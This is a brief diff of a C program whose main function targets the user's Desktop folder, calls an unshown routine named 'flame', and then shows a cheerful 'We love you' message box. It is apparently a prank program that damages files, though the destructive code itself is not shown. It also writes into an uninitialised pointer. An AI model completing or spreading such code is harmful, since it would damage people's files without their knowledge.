@@ -13,12 +13,13 @@ void fill(const char *filename);
 int recognize_dir(char *file);
 void flame(char *basepath);
 
-int main(int argc, char *argv[]){
+int main(){
     char *sus;
     wchar_t *sussybaka=_wgetenv(L"USERPROFILE");
     sprintf(sus,"%ls\\Desktop",sussybaka);
     flame(sus);
     MessageBox(NULL,"\nWe love you.\n\n:3\n\n",__FILE__,1);
+    return 0;
 }
 
 void fill(const char *filename){
